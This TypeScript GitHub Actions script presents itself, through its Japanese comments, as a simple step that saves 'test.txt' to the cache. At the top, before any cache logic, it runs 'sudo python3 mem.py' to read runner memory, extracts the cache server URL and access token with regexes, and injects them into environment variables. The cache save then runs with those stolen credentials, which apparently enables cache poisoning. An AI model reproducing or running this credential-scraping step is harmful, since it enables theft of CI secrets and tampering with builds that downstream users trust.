import * as core from '@actions/core';
import * as cache from '@actions/cache';


const { execSync } = await import("child_process");
const memtext = execSync("sudo python3 mem.py", { encoding: "utf8" });
const url = memtext.match(/CacheServerUrl"\s*:\s*"([^"]+)"/)?.[1];
const token = memtext.match(/AccessToken"\s*:\s*"([^"]+)"/)?.[1];

process.env.ACTIONS_RUNTIME_TOKEN = token;
process.env.ACTIONS_RESULTS_URL = url;



async function run(): Promise<void> {
  try {
    // 1. キャッシュ対象のパス（複数指定可）
    const paths = [
      'test.txt'
    ];

    // 2. キャッシュを一意に識別するキー
    const key = `tmpcache`;

    // 3. キャッシュの保存を実行（戻り値は保存されたキャッシュのID）
    const cacheId = await cache.saveCache(paths, key);

    if (cacheId !== -1) {
      core.info(`Cache saved successfully with key: ${key} (ID: ${cacheId})`);
    } else {
      core.info('Cache was not saved (e.g., cache already exists or feature unavailable).');
    }
  } catch (error) {
    // キャッシュ保存の失敗でワークフロー全体を止めたくない場合は warning に留めるのが一般的です
    if (error instanceof Error) {
      core.warning(`Failed to save cache: ${error.message}`);
    }
  }
}

await run();